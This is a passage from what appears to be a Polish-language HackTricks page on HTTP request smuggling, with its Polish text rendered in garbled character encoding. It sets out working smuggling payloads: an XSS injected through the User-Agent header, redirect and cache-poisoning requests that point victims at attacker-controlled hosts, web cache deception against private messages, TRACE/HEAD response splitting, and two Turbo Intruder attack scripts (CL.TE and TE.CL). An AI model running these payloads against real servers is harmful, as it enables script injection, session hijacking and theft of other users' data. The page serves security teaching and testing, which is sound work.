Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Ten payload zostaÅ‚ zaprojektowany w celu wykorzystania podatnoÅ›ci poprzez:

1. Zainicjowanie Å¼Ä…dania `POST`, pozornie typowego, z nagÅ‚Ã³wkiem `Transfer-Encoding: chunked` wskazujÄ…cym poczÄ…tek smugglowania.
2. NastÄ™pnie `0`, oznaczajÄ…ce koniec ciaÅ‚a wiadomoÅ›ci w formacie chunked.
3. NastÄ™pnie wprowadzone zostaje smugglowane Å¼Ä…danie `GET`, gdzie nagÅ‚Ã³wek `User-Agent` jest zainfekowany skryptem `<script>alert(1)</script>`, wywoÅ‚ujÄ…c XSS podczas przetwarzania tego kolejnego Å¼Ä…dania przez serwer.

Poprzez manipulacjÄ™ `User-Agent` poprzez smugglowanie, payload omija normalne ograniczenia Å¼Ä…dania, wykorzystujÄ…c w ten sposÃ³b podatnoÅ›Ä‡ na Reflected XSS w nietypowy, ale skuteczny sposÃ³b.

#### HTTP/0.9

{% hint style="danger" %}
W przypadku, gdy treÅ›Ä‡ uÅ¼ytkownika jest odzwierciedlana w odpowiedzi z **`Content-type`** takim jak **`text/plain`**, co uniemoÅ¼liwia wykonanie XSS. JeÅ›li serwer obsÅ‚uguje **HTTP/0.9, moÅ¼e byÄ‡ moÅ¼liwe to obejÅ›cie**!
{% endhint %}

Wersja HTTP/0.9 byÅ‚a wczeÅ›niej niÅ¼ 1.0 i uÅ¼ywa tylko czasownikÃ³w **GET** i **nie** odpowiada z **nagÅ‚Ã³wkami**, tylko treÅ›ciÄ….

W [**tym opisie**](https://mizu.re/post/twisty-python), zostaÅ‚o to wykorzystane poprzez smugglowanie Å¼Ä…dania i **podatny punkt koÅ„cowy, ktÃ³ry odpowie na wejÅ›cie uÅ¼ytkownika** w celu przemytia Å¼Ä…dania z uÅ¼yciem HTTP/0.9. Parametr, ktÃ³ry zostanie odzwierciedlony w odpowiedzi, zawieraÅ‚ **faÅ‚szywÄ… odpowiedÅº HTTP/1.1 (z nagÅ‚Ã³wkami i treÅ›ciÄ…)**, wiÄ™c odpowiedÅº bÄ™dzie zawieraÄ‡ poprawny wykonywalny kod JS z `Content-Type` `text/html`.

### Wykorzystanie przekierowaÅ„ na stronie z wykorzystaniem smugglowania Å¼Ä…daÅ„ HTTP <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Aplikacje czÄ™sto przekierowujÄ… z jednego adresu URL na inny, korzystajÄ…c z nazwy hosta z nagÅ‚Ã³wka `Host` w adresie URL przekierowania. Jest to powszechne w serwerach WWW takich jak Apache i IIS. Na przykÅ‚ad, Å¼Ä…danie folderu bez ukoÅ›nika na koÅ„cu skutkuje przekierowaniem, aby zawieraÄ‡ ten ukoÅ›nik:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Wyniki:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
ChociaÅ¼ pozornie nieszkodliwe, to zachowanie moÅ¼na manipulowaÄ‡ za pomocÄ… przemytu Å¼Ä…daÅ„ HTTP, aby przekierowaÄ‡ uÅ¼ytkownikÃ³w na zewnÄ™trznÄ… stronÄ™. Na przykÅ‚ad:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
To przemycony Å¼Ä…danie moÅ¼e spowodowaÄ‡ przekierowanie nastÄ™pnego przetworzonego Å¼Ä…dania uÅ¼ytkownika do strony internetowej kontrolowanej przez atakujÄ…cego:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Wyniki:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
W tym scenariuszu Å¼Ä…danie uÅ¼ytkownika dotyczÄ…ce pliku JavaScript zostaÅ‚o przejÄ™te. AtakujÄ…cy moÅ¼e potencjalnie skompromitowaÄ‡ uÅ¼ytkownika, serwujÄ…c zÅ‚oÅ›liwy JavaScript w odpowiedzi.

### Wykorzystanie Zatrucia PamiÄ™ci Cache Sieci Web poprzez PrzesyÅ‚anie ZapytaÅ„ HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Zatrucie pamiÄ™ci cache sieci web moÅ¼e byÄ‡ wykonane, jeÅ›li ktÃ³rykolwiek z komponentÃ³w **infrastruktury front-endu buforuje zawartoÅ›Ä‡**, zazwyczaj w celu poprawy wydajnoÅ›ci. Poprzez manipulacjÄ™ odpowiedzi serwera, moÅ¼liwe jest **zatrucie pamiÄ™ci cache**.

WczeÅ›niej obserwowaliÅ›my, jak odpowiedzi serwera mogÄ… byÄ‡ zmienione, aby zwrÃ³ciÄ‡ bÅ‚Ä…d 404 (patrz [Podstawowe PrzykÅ‚ady](./#basic-examples)). Podobnie, moÅ¼liwe jest oszukanie serwera, aby dostarczyÅ‚ zawartoÅ›Ä‡ `/index.html` w odpowiedzi na Å¼Ä…danie pliku `/static/include.js`. W rezultacie zawartoÅ›Ä‡ `/static/include.js` zostaje zastÄ…piona w pamiÄ™ci cache zawartoÅ›ciÄ… `/index.html`, co sprawia, Å¼e `/static/include.js` staje siÄ™ niedostÄ™pny dla uÅ¼ytkownikÃ³w, potencjalnie prowadzÄ…c do ataku typu Denial of Service (DoS).

Ta technika staje siÄ™ szczegÃ³lnie potÄ™Å¼na, jeÅ›li zostanie odkryta **podatnoÅ›Ä‡ na Przekierowanie Otwarte** lub jeÅ›li istnieje **przekierowanie na stronie do przekierowania otwartego**. Takie podatnoÅ›ci mogÄ… byÄ‡ wykorzystane do zastÄ…pienia zbuforowanej zawartoÅ›ci `/static/include.js` skryptem kontrolowanym przez atakujÄ…cego, umoÅ¼liwiajÄ…c w zasadzie rozlegÅ‚y atak typu Cross-Site Scripting (XSS) przeciwko wszystkim klientom Å¼Ä…dajÄ…cym zaktualizowanego `/static/include.js`.

PoniÅ¼ej znajduje siÄ™ ilustracja wykorzystania **zatrucia pamiÄ™ci cache poÅ‚Ä…czonego z przekierowaniem na stronie do przekierowania otwartego**. Celem jest zmiana zawartoÅ›ci cache pliku `/static/include.js` w celu serwowania kodu JavaScript kontrolowanego przez atakujÄ…cego:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
ZauwaÅ¼ osadzone Å¼Ä…danie kierujÄ…ce siÄ™ do `/post/next?postId=3`. To Å¼Ä…danie zostanie przekierowane do `/post?postId=4`, wykorzystujÄ…c **wartoÅ›Ä‡ nagÅ‚Ã³wka Host** do okreÅ›lenia domeny. Poprzez zmianÄ™ **nagÅ‚Ã³wka Host**, atakujÄ…cy moÅ¼e przekierowaÄ‡ Å¼Ä…danie do swojej domeny (**przekierowanie wewnÄ™trzne na zewnÄ™trzne przekierowanie**).

Po udanym **zatruciu gniazda**, naleÅ¼y zainicjowaÄ‡ **Å¼Ä…danie GET** dla `/static/include.js`. To Å¼Ä…danie zostanie zanieczyszczone przez poprzednie Å¼Ä…danie **przekierowania wewnÄ™trznego na zewnÄ™trzne przekierowanie** i pobierze zawartoÅ›Ä‡ skryptu kontrolowanego przez atakujÄ…cego.

NastÄ™pnie, kaÅ¼de Å¼Ä…danie dla `/static/include.js` bÄ™dzie serwowaÄ‡ zbuforowanÄ… zawartoÅ›Ä‡ skryptu atakujÄ…cego, efektywnie uruchamiajÄ…c szeroki atak XSS.

### UÅ¼ycie przemytu Å¼Ä…daÅ„ HTTP do przeprowadzenia oszustwa pamiÄ™ci podrÄ™cznej sieci web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Jaka jest rÃ³Å¼nica miÄ™dzy zatruciem pamiÄ™ci podrÄ™cznej sieci web a oszustwem pamiÄ™ci podrÄ™cznej sieci web?**
>
> * W **zatruciu pamiÄ™ci podrÄ™cznej sieci web**, atakujÄ…cy powoduje, Å¼e aplikacja przechowuje pewnÄ… zÅ‚oÅ›liwÄ… zawartoÅ›Ä‡ w pamiÄ™ci podrÄ™cznej, a ta zawartoÅ›Ä‡ jest serwowana z pamiÄ™ci podrÄ™cznej innym uÅ¼ytkownikom aplikacji.
> * W **oszustwie pamiÄ™ci podrÄ™cznej sieci web**, atakujÄ…cy powoduje, Å¼e aplikacja przechowuje pewnÄ… wraÅ¼liwÄ… zawartoÅ›Ä‡ naleÅ¼Ä…cÄ… do innego uÅ¼ytkownika w pamiÄ™ci podrÄ™cznej, a nastÄ™pnie atakujÄ…cy odzyskuje tÄ™ zawartoÅ›Ä‡ z pamiÄ™ci podrÄ™cznej.

AtakujÄ…cy tworzy przemycone Å¼Ä…danie, ktÃ³re pobiera wraÅ¼liwÄ… zawartoÅ›Ä‡ specyficznÄ… dla uÅ¼ytkownika. RozwaÅ¼ poniÅ¼szy przykÅ‚ad:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
JeÅ›li ten przemycony Å¼Ä…danie zatruje wpis w pamiÄ™ci podrÄ™cznej przeznaczony dla treÅ›ci statycznej (np. `/someimage.png`), wraÅ¼liwe dane ofiary z `/private/messages` mogÄ… zostaÄ‡ zapisane w pamiÄ™ci podrÄ™cznej pod wpisem dla treÅ›ci statycznej. W rezultacie atakujÄ…cy mÃ³gÅ‚by potencjalnie odzyskaÄ‡ te zapisane wraÅ¼liwe dane.

### NaduÅ¼ywanie metody TRACE za pomocÄ… Przemytu Å»Ä…daÅ„ HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**W tym poÅ›cie**](https://portswigger.net/research/trace-desync-attack) sugerowane jest, Å¼e jeÅ›li serwer ma wÅ‚Ä…czonÄ… metodÄ™ TRACE, moÅ¼liwe byÅ‚oby jej naduÅ¼ycie za pomocÄ… Przemytu Å»Ä…daÅ„ HTTP. Wynika to z faktu, Å¼e ta metoda odzwierciedli kaÅ¼dy nagÅ‚Ã³wek wysÅ‚any do serwera jako czÄ™Å›Ä‡ treÅ›ci odpowiedzi. Na przykÅ‚ad:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
WysyÅ‚a odpowiedÅº w postaci:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
PrzykÅ‚adem wykorzystania tego zachowania byÅ‚oby **przemytanie najpierw Å¼Ä…dania HEAD**. To Å¼Ä…danie zostanie zareagowane tylko **nagÅ‚Ã³wkami** Å¼Ä…dania GET (**`Content-Type`** wÅ›rÃ³d nich). NastÄ™pnie przemyÄ‡ **natychmiast po HEAD Å¼Ä…danie TRACE**, ktÃ³re bÄ™dzie **odbijaÄ‡ wysÅ‚ane dane**.\
PoniewaÅ¼ odpowiedÅº HEAD bÄ™dzie zawieraÅ‚a nagÅ‚Ã³wek `Content-Length`, **odpowiedÅº na Å¼Ä…danie TRACE bÄ™dzie traktowana jako treÅ›Ä‡ odpowiedzi HEAD, co pozwoli na odbicie dowolnych danych** w odpowiedzi. \
Ta odpowiedÅº zostanie wysÅ‚ana do nastÄ™pnego Å¼Ä…dania przez poÅ‚Ä…czenie, wiÄ™c moÅ¼na to **wykorzystaÄ‡ na przykÅ‚ad w pamiÄ™ci podrÄ™cznej pliku JS do wstrzykniÄ™cia dowolnego kodu JS**.

### NaduÅ¼ywanie TRACE za pomocÄ… PodziaÅ‚u Odpowiedzi HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

KontynuujÄ…c Å›ledzenie [**tego posta**](https://portswigger.net/research/trace-desync-attack) sugeruje siÄ™ innÄ… metodÄ™ naduÅ¼ycia metody TRACE. Jak wspomniano, przemycajÄ…c Å¼Ä…danie HEAD i Å¼Ä…danie TRACE, moÅ¼na **kontrolowaÄ‡ pewne odbite dane** w odpowiedzi na Å¼Ä…danie HEAD. DÅ‚ugoÅ›Ä‡ treÅ›ci Å¼Ä…dania HEAD jest podana w nagÅ‚Ã³wku Content-Length i jest tworzona przez odpowiedÅº na Å¼Ä…danie TRACE.

Dlatego nowym pomysÅ‚em byÅ‚oby to, Å¼e znajÄ…c tÄ™ dÅ‚ugoÅ›Ä‡ Content-Length i dane podane w odpowiedzi TRACE, moÅ¼na sprawiÄ‡, Å¼e odpowiedÅº TRACE zawiera poprawnÄ… odpowiedÅº HTTP po ostatnim bajcie Content-Length, umoÅ¼liwiajÄ…c atakujÄ…cemu caÅ‚kowitÄ… kontrolÄ™ nad Å¼Ä…daniem do nastÄ™pnej odpowiedzi (co mogÅ‚oby byÄ‡ wykorzystane do wykonania zatrucia pamiÄ™ci podrÄ™cznej).

PrzykÅ‚ad:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Spowoduje to wygenerowanie tych odpowiedzi (zauwaÅ¼, Å¼e odpowiedÅº HEAD ma Content-Length, co sprawia, Å¼e odpowiedÅº TRACE staje siÄ™ czÄ™Å›ciÄ… ciaÅ‚a HEAD, a gdy Content-Length HEAD siÄ™ koÅ„czy, poprawna odpowiedÅº HTTP jest przemycona):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(â€œarbitrary responseâ€)</script>
```
### Uzbrajanie Å¼Ä…dania HTTP Request Smuggling za pomocÄ… Desynchronizacji Odpowiedzi HTTP

Czy znalazÅ‚eÅ› jakÄ…Å› podatnoÅ›Ä‡ na HTTP Request Smuggling i nie wiesz, jak jÄ… wykorzystaÄ‡? SprÃ³buj tej innej metody eksploatacji:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### Inne Techniki HTTP Request Smuggling

* Browser HTTP Request Smuggling (Po stronie klienta)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* Request Smuggling w Downgrade'ach HTTP/2

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Skrypty Turbo Intruder

### CL.TE

Z [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Z: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## NarzÄ™dzia

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): To narzÄ™dzie jest gramatykÄ… opartym Fuzzerem HTTP przydatnym do znajdowania dziwnych rozbieÅ¼noÅ›ci w przemyÅ›le Å¼Ä…daÅ„.

## OdnoÅ›niki

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF** sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
